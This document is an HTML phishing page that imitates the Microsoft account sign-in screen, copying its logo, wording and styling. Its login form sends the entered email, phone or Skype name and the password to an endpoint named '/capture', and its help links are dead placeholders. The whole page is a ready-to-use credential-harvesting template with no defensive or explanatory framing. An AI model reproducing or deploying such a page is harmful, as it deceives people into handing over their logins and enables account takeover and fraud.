<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Sign in to your account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f2f2f2;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.ms-logo{display:flex;gap:2px;margin-bottom:16px}
.ms-logo div{width:10px;height:10px}
.ms-logo .r{background:#f25022}.ms-logo .g{background:#7fba00}
.ms-logo .b{background:#00a4ef}.ms-logo .y{background:#ffb900}
.brand{font-size:1.1rem;font-weight:600;color:#1b1b1b;margin-bottom:4px}
h1{font-size:1.5rem;font-weight:300;color:#1b1b1b;margin-bottom:20px}
input{width:100%;padding:6px 10px;border:none;border-bottom:1px solid #666;
font-size:15px;outline:none;margin-bottom:16px;color:#1b1b1b}
input:focus{border-bottom:2px solid #0067b8;margin-bottom:15px}
.btn{display:inline-block;padding:6px 20px;background:#0067b8;color:#fff;
border:none;font-size:15px;cursor:pointer;min-width:108px}
.btn:hover{background:#005da6}
.links{margin-top:16px;font-size:13px}
.links a{color:#0067b8;text-decoration:none;display:block;margin-bottom:6px}
.links a:hover{text-decoration:underline;color:#005da6}
.footer{margin-top:20px;font-size:12px;color:#8c8c8c}
</style>
</head>
<body>
<div class="card">
<div class="ms-logo"><div class="r"></div><div class="g"></div><div class="y"></div><div class="b"></div></div>
<div class="brand">Microsoft</div>
<h1 data-i18n="title">Sign in</h1>
<form method="POST" action="/capture">
<input type="text" name="username" data-i18n-ph="email_ph" placeholder="Email, phone, or Skype" required autocomplete="off">
<input type="password" name="password" data-i18n-ph="pass_ph" placeholder="Password" required>
<div style="text-align:right"><button type="submit" class="btn" data-i18n="next">Next</button></div>
</form>
<div class="links">
<a href="#" data-i18n="forgot">Forgot my password</a>
<a href="#" data-i18n="options">Sign-in options</a>
</div>
<div class="footer" data-i18n="no_account">No account? <a href="#" style="color:#0067b8;text-decoration:none">Create one!</a></div>
</div>
